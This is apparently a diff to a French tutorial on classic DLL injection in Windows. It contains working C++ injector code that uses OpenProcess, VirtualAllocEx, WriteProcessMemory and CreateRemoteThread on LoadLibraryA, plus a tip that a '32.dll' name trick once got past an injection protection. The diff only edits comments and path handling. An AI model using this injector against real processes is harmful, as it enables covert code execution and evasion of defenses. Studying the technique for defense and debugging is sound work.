@@ -49,7 +49,7 @@ Exemple :
 Allouez le nom de la DLL à injecter dans la mémoire du processus cible.
 
 > Cette étape peut être ignorée si un nom de DLL approprié est déjà disponible dans le processus cible. Par exemple, si un processus est lié à `User32.dll`,
-`GDI32.dll`, `Kernel32.dll` ou toute autre bibliothèque dont le nom se termine par `32.dll`, il serait possible de charger une bibliothèque nommée `32 .dll`.
+`GDI32.dll`, `Kernel32.dll` ou toute autre bibliothèque dont le nom se termine par `32.dll`, il serait possible de charger une bibliothèque nommée `32.dll`.
 Cette technique s'est révélée efficace dans le passé contre une méthode de protection des processus contre l'`injection de DLL`.
 
 ### Créez un nouveau thread dans le processus cible (Windows)
@@ -105,7 +105,7 @@ VOID GetProcessEntry32ByName(const char* szProcessName, DWORD th32ProcessID, LPP
 
 BOOL InjectModule(DWORD processId, const char* filename)
 {
-	// Opens an existing local process object.
+	// Retrieving a handle to the target process.
 	printf("[+]Opening process by process id (0x%08x).\n\n", processId);
 	HANDLE hProcess = OpenProcess(
 		PROCESS_ALL_ACCESS, // The access to the process object.
@@ -119,7 +119,7 @@ BOOL InjectModule(DWORD processId, const char* filename)
 	}
 	printf("[+]Succesfully open handle (0x08%p).\n\n", hProcess);
 
-	// Reserves memory in the virtual address space of a specified process.
+	// Allocating memory in the target process
 	printf("[+]Reserve memory in the virtual address space of the target process.\n");
 	size_t dwFilepathSize			= strlen(filename) + 1;
 	LPVOID pDllFilenameAllocAddr	= VirtualAllocEx(
@@ -155,8 +155,8 @@ BOOL InjectModule(DWORD processId, const char* filename)
 	}
 	printf("[+]Succesfully set virtual protect (0x%08x).\n", lpflOldProtect);
 
+	// Writing the dll path into that memory.
 	printf("\t[+]Writes module filename to an area of memory in a target process.\n");
-	// Writes data to an area of memory in a specified process. 
 	SIZE_T lpNumberOfBytesWritten;
 	success = WriteProcessMemory(
 		hProcess,				// A handle to the process memory to be modified.
@@ -197,26 +197,24 @@ BOOL InjectModule(DWORD processId, const char* filename)
 	printf("[+]Succesfully reset virtual protect (0x%08x).\n\n", lpflOldProtect);
 
 	// GetProcAddress
-	HMODULE hModuleKernel32 = LoadLibraryA("kernel32");
+	HMODULE hModuleKernel32 = LoadLibrary("kernel32");
 	if (hModuleKernel32 == 0)
 	{
 		printf("[!]Failed to load module kernel32\n");
 		CloseHandle(hProcess);
 		return FALSE;
 	}
-	LPTHREAD_START_ROUTINE addrLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(
-		hModuleKernel32,
-		"LoadLibraryA"
-	);
+	// Getting LoadLibraryA address (same across all processes) to start execution at it
+	LPTHREAD_START_ROUTINE loadLibraryAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(hModuleKernel32, "LoadLibraryA");
 
-	// Create a thread that runs in the virtual address space of another process.
+	// Starting a remote execution thread at LoadLibraryA and passing the dll path as an argument.
 	printf("[+]Creating remote thread in target Process.\n");
 	DWORD lpThreadId;
 	HANDLE hThread = CreateRemoteThread(
 		hProcess,				// A handle to the process in which the thread is to be created.
 		nullptr,				// A pointer to a SECURITY_ATTRIBUTES structure.
 		0,						// The initial size of the stack, in bytes. 
-		addrLoadLibrary,		// A pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed by the thread and represents the starting address of the thread in the remote process.
+		loadLibraryAddr,		// A pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed by the thread and represents the starting address of the thread in the remote process.
 		pDllFilenameAllocAddr,	// A pointer to a variable to be passed to the thread function.
 		0,						// The flags that control the creation of the thread.
 		&lpThreadId				// A pointer to a variable that receives the thread identifier.
@@ -229,15 +227,10 @@ BOOL InjectModule(DWORD processId, const char* filename)
 	}
 	printf("[+]Succesfully Create Remote thread in target Process.\n");
 
-	// Wait htread is finished
 	printf("[+]Wait thread is loaded module as terminate.\n\n");
-	WaitForSingleObject(hThread, INFINITE);
+	WaitForSingleObject(hThread, INFINITE); // Waiting for it to be finished
+	CloseHandle(hThread);					// Freeing the injected thread handle
 
-	DWORD exit_code;
-	GetExitCodeThread(hThread, &exit_code);	// Retrieving the return value, i.e., the module
-											// Handle returned by LoadLibraryA
-
-	CloseHandle(hThread);											// Freeing the injected thread handle
 	VirtualFreeEx(hProcess, pDllFilenameAllocAddr, 0, MEM_RELEASE);	// The memory allocated for the DLL filepath
 	CloseHandle(hProcess);											// The handle for the target process
 
@@ -249,7 +242,7 @@ int main(int argc, char* argv[])
 	// Args required
 	if (argc < 3)
 	{
-		printf("[!]Usage : <Exe> <Dll>\n");
+		printf("[!]Usage : <ExeWindowName> <DLLFilepath>\n");
 		return EXIT_FAILURE;
 	}
 
@@ -261,15 +254,16 @@ int main(int argc, char* argv[])
 	printf("\t[+]Module ID         = 0x%08X\n\n", pe32.th32ModuleID);	// this module
 
 	// Inject module
-	const char* moduleFilename = argv[2];
-	if (!InjectModule(pe32.th32ProcessID, moduleFilename))
+	char dllFilepath[_MAX_PATH]; // getting the full path of the dll file
+	GetFullPathName(argv[2], _MAX_PATH, dllFilepath, NULL);
+	if (!InjectModule(pe32.th32ProcessID, dllFilepath))
 	{
-		printf("[!]Failed to inject <%s>.\n", moduleFilename);
+		printf("[!]Failed to inject <%s>.\n", dllFilepath);
 		return EXIT_FAILURE;
 	}
 
 	// Successfully
-	printf("[+]Successfully Injected module <%s> :).\n\n", moduleFilename);
+	printf("[+]Successfully Injected module <%s> :).\n\n", dllFilepath);
 	system("pause");
 
 	return EXIT_SUCCESS;
